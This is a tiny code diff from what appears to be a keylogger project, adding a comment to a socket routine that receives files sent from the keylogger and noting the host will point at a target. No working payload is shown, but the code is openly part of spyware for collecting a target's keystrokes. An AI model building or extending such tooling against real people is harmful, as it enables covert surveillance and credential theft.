@@ -7,6 +7,7 @@ def openListener():
     
     #used for listening for the file coming in from the keylogger. 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    #Will be changed to reflect the hostname of the target IP
     host = socket.gethostname()
     port = 1234
     s.connect((host, port))
